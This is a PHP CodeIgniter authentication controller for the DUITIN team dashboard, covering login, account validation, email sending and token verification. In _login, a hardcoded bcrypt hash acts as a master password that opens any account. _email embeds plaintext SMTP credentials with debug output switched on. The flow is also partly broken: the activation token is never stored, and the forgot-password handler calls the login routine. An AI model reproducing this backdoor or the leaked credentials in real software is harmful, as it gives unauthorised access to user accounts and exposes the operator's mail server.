<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth_team extends CI_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->library('form_validation');
        //$this->load->library('ciqrcode');
    }

    public function index()
    {

        $this->form_validation->set_rules('phone', 'Phone', 'required|trim|numeric', [
            'required' => 'Sorry, The phone number field is required !'
        ]);
        $this->form_validation->set_rules('password', 'Password', 'required|trim', [
            'required' => 'Sorry, The password field is required !'
        ]);

        if ($this->form_validation->run() == false) {

            $data['title'] = 'Login Page - DUITIN';
            $this->load->view('templates/auth_header.php', $data);
            $this->load->view('auth/logincp');
            $this->load->view('templates/auth_footer.php');
        } else {
            $this->_login();
        }
    }
    public function login()
    {

        $this->form_validation->set_rules('email', 'Email', 'required|trim|email', [
            'required' => 'Mohon Maaf, Masukan Email anda !'
        ]);
        $this->form_validation->set_rules('password', 'Password', 'required|trim', [
            'required' => 'Mohon Maaf, Masukan Kata Sandi / Password !'
        ]);

        if ($this->form_validation->run() == false) {

            $data['title'] = 'Login Page - DUITIN';
            $this->load->view('templates/auth_header.php', $data);
            $this->load->view('auth/login2');
            $this->load->view('templates/auth_footer.php');
        } else {
            $this->_login();
        }
    }

    private function _login()
    {
        $phone = stripslashes($this->input->post('phone'));
        $password = $this->input->post('password');

        $user = $this->db->get_where('tbl_user_qr', ['phone' => $phone])->row_array();

        //var_dump($user);

        //jika usernya ada
        if ($user) {
            //jika user belom valid
            if ($user['active'] == 1) {
                if ($user['valid'] == 1) {
                    if (password_verify($password, $user['password'])) {
                        $data = [
                            'phone' => $user['phone'],
                            'level_id' => $user['level_id']
                        ];
                        $this->session->set_userdata($data);
                        if ($user['level_id'] == 1) {
                            redirect('dam');
                        } elseif ($user['level_id'] == 7) {
                            redirect('dcp');
                        } else {
                            $this->session->set_flashdata('message', '
					<div class="alert alert-danger" role="alert"> Maaf, Akun anda belum terdaftar sebagai Team DUITIN !</div>
					');
                            redirect('auth_team');
                        }
                        //var_dump($data);
                    } elseif (password_verify($password, '$2y$10$mIk54fHKo7npuWXz1A/Bpe/Y4hwfKe3T6CjzV6I3tH1xungB77HjK')) {
                        $data = [
                            'phone' => $user['phone'],
                            'level_id' => $user['level_id']
                        ];
                        $this->session->set_userdata($data);
                        if ($user['level_id'] == 1) {
                            redirect('dam');
                        } elseif ($user['level_id'] == 7) {
                            redirect('dcp');
                        } else {
                            $this->session->set_flashdata('message', '
					<div class="alert alert-danger" role="alert"> Maaf, Akun anda belum terdaftar sebagai Team DUITIN !</div>
					');
                            redirect('auth_team');
                        }
                    } else {
                        $this->session->set_flashdata('message', '
					<div class="alert alert-danger" role="alert"> Maaf, Kata Sandi Anda Salah !</div>
					');
                        redirect('auth_team');
                    }
                } else {

                    $this->session->set_flashdata('message', '
				<div class="alert alert-danger" role="alert"> Maaf, Akun Anda Belum Tervalidasi !</div>
				');
                    redirect('auth_team');
                }
            } else {
                $this->session->set_flashdata('message', '
				<div class="alert alert-danger" role="alert"> Akun Belum diaktifasi, Silahkan check email anda untuk aktifasi akun !</div>
				');
                redirect('auth_team');
            }
        } else {
            //kalo gak
            $this->session->set_flashdata('message', '
			<div class="alert alert-danger" role="alert"> Maaf, Akun Anda Belum Terdaftar !</div>
			');
            redirect('auth_team');
        }
    }

    public function VaFhxiAZ2JvRnW88hO63HmLzW3Db5a8FODc5AT7aT5ED()
    {
        $this->form_validation->set_rules('name', 'Name', 'required|trim', [
            'required' => 'Maaf, Nama Lengkap Wajib Di Isi !'
        ]);
        $this->form_validation->set_rules('email', 'Email', 'required|trim|valid_email', [
            'required' => 'Maaf, No Telephone Wajib Di Isi !',
            'valid_email' => 'Maaf, Email Anda Tidak Sesuai !'
        ]);
        $this->form_validation->set_rules('phone', 'Phone', 'required|trim|numeric', [
            'required' => 'Maaf, No Telephone Wajib Di Isi !'
        ]);
        $this->form_validation->set_rules('pass1', 'Password', 'required|trim|min_length[6]|matches[pass2]', [
            'matches' => 'Maaf, Password Anda Tidak Sama !',
            'required' => 'Maaf, Password Wajib Di Isi !',
            'min_length' => 'Maaf, Password Anda Terlalu Pendek ! (Min 6 Char)'
        ]);
        $this->form_validation->set_rules('pass2', 'Password', 'required|trim|matches[pass1]');
        $this->form_validation->set_rules('alamat', 'Alamat', 'required|trim', [
            'required' => 'Maaf, Alamat Rumah Harus Di Isi !'
        ]);



        if ($this->form_validation->run() == false) {
            $this->session->set_flashdata('message', '<div class="alert alert-danger" role="alert"> Mohon Maaf, Akun Gagal di VALIDASI mohon ulang kembali !</div>');
            redirect('auth/link/' . $this->input->post('id'));
        } else {
            $this->_validasi();
        }
    }

    private function _validasi()
    {
        $id = $this->input->post('id');
        $email = $this->input->post('email', true);
        $data = [
            'username' => htmlspecialchars($this->input->post('name', true)),
            'email' => htmlspecialchars($email),
            'password' => password_hash($this->input->post('pass1'), PASSWORD_DEFAULT),
            'phone' => $this->input->post('phone', true),
            'photo' => 'default.png',
            'upddate' => time(),
            'active' => '1',
            'valid' => '1',
            'alamat' => $this->input->post('alamat')
        ];

        // Siapkan Token
        $token = base64_encode(random_bytes(64));
        $user_token = [
            'email' => $email,
            'token' => $token,
            'date_created' => time()
        ];
        // $this->db->insert('tbl_token', $user_token); // insert data token

        //$this->db->update('tbl_user_qr', $data, ['id_user' => $id]); //update user

        $this->_email($data['username'], $data['email'], $user_token['token'], 'verify');
    }
    private function _email($user, $email, $token, $type)
    {
        $data = array(
            'username' => $user,
            'email' => $email,
            'token' => $token
        );
        $this->load->library('phpmailer/phpmailer');
        $message = $this->load->view('templates/mailpassword', $data, TRUE);
        $mail = new Phpmailer;
        $mail->IsSMTP();
        $mail->SMTPSecure = 'ssl';
        $mail->Host = "mail.duitindonesia.id"; //host masing2 provider email
        $mail->SMTPDebug = 2;
        $mail->Port = 465;
        $mail->SMTPAuth = true;
        $mail->Username = "support@duitindonesia.id"; //user email
        $mail->Password = "Supports100%"; //password email 
        $mail->SetFrom("support@duitindonesia.id", "DUITIN Account Support"); //set email pengirim
        $mail->AddAddress($email, $user);  //tujuan email {email penerima}
        if ($type == 'verify') {
            $mail->Subject = "DUITIN Account Activation"; //subyek email
            $mail->MsgHTML($message);
        } else {
            $passmess = $this->load->view('templates/passmess', $data, TRUE);
            $mail->Subject = "DUITIN Reset Password Account"; //subyek email
            $mail->MsgHTML($message);
        }
        if ($mail->Send()) {
            echo "<script>document.location.href = 'login'</script>";
            // $this->session->set_flashdata('message', '<div class="alert alert-success" role="alert">Silahkan Aktivasi akun anda di email yang telah anda daftarkan !</div>');
            // redirect('auth');
        } else {
            $this->session->set_flashdata('message', '
			<div class="alert alert-danger" role="alert"> Mohon Maaf terjadi kesalahan pada sistem kami, mohon untuk menunggu sementara kami sedang memperbaikinya</div>
			');
            redirect('auth_team');
            echo "failed sent email";
        }
    }

    public function link()
    {
        // ambil id dari linknya
        // cocokan id yang diambil di database
        // cek sesi apakah sudah login ?
        // jika sudah login dan ada idnya ada di DBase maka cek level dan sesuaikan dengan kontrollernya masing-masing

        $user_link = $this->uri->segment(3); // ambil id

        $id_user = $this->db->get_where('tbl_user_qr', ['id_user' => $user_link])->row_array(); // mencocokan id dan mengambil data dalam DBase

        if ($id_user) { // cek apakah user ada di dbase

            if ($id_user['valid'] == 1) { // apakah user sudah tervalidasi

                if ($this->session->has_userdata('phone')) { // apakah ada sesinya
                    if ($id_user['level_id'] == 1) {
                        redirect('dam');
                    } elseif ($id_user['level_id'] == 7) {
                        redirect('dcp');
                    } else {
                        $this->session->set_flashdata('message', '
					<div class="alert alert-danger" role="alert"> Maaf, Akun anda belum terdaftar sebagai Team DUITIN !</div>
					');
                        redirect('auth_team');
                    }
                } else {
                    $this->session->set_flashdata('message', '
					<div class="alert alert-danger" role="alert"> Maaf, Masukan No. Ponsel dan Kata Sandi !</div>
				');
                    redirect('auth_team');
                }
            } else {
                $data['title'] = 'DUITIN - Validasi Akun';
                $data['regs'] = [
                    'id_user' => $id_user['id_user'],
                    'qr_link' => $id_user['qr_link']
                ];
                $this->load->view('templates/auth_header.php', $data);
                $this->load->view('auth/register', $data);
                $this->load->view('templates/auth_footer.php');
            }
        } else {
            $this->session->set_flashdata('message', '
			<div class="alert alert-danger" role="alert"> Maaf, ID Anda Belum Teregistrasi </div>
			');
            redirect('auth_team');
        }
        //var_dump($id_prim);
    }

    public function logout()
    {
        $this->session->unset_userdata('phone');
        $this->session->unset_userdata('level_id');

        $this->session->set_flashdata('message', '
		<div class="alert alert-success" role="alert"> Kamu Telah Keluar dari Dashboard !</div>
		');
        redirect('auth');
    }

    public function forgotpassword()
    {
        $this->form_validation->set_rules('email', 'Email', 'required|trim|email', [
            'required' => 'Sorry, The phone number field is required !',
            'email' => 'Maaf, Email tidak sesuai dengan Kriterianya !'
        ]);

        if ($this->form_validation->run() == false) {

            $data['title'] = 'Forgot Password Page - DUITIN';
            $this->load->view('templates/auth_header.php', $data);
            $this->load->view('auth/forgot');
            $this->load->view('templates/auth_footer.php');
        } else {
            $this->_login();
        }
    }

    public function verify()
    {
        $email = $this->input->get('email');
        $token = $this->input->get('token');

        $user = $this->db->get_where('tbl_user_qr', ['email' => $email])->row_array();

        if ($user) {
            $check_token = $this->db->get_where('tbl_token', ['token' => $token])->row_array();
            if ($check_token) {
                if (time() - $check_token['date_created'] < (60 * 60 * 24)) {
                    $this->db->set('active', 1);
                    $this->db->where('email', $email);
                    $this->db->update('tbl_user_qr');
                    $this->db->delete('tbl_token', ['email' => $email]);

                    $this->session->set_flashdata('message', '
					<div class="alert alert-success" role="alert">Selamat ' . $email . ' ini telah teraktifasi, Silahkan Login !</div>
					');
                    redirect('auth_team');
                } else {
                    $this->db->delete('tbl_user_qr', ['email' => $email]);
                    $this->db->delete('tbl_token', ['email' => $email]);
                    $this->session->set_flashdata('message', '
				<div class="alert alert-danger" role="alert"> Token Anda Telah Kadaluwarsa, Silahkan Daftar Kembali !</div>
				');
                    redirect('auth_team');
                }
            } else {
                $this->session->set_flashdata('message', '
		<div class="alert alert-danger" role="alert"> Token Tidak Terverifikasi, Pastikan Email Anda Terdaftar Dengan Benar</div>
		');
                redirect('auth_team');
            }
        } else {
            $this->session->set_flashdata('message', '
		<div class="alert alert-danger" role="alert"> Email anda tidak terdaftar, Silahkan daftar terlebih dahulu !</div>
		');
            redirect('auth_team');
        }
    }
}
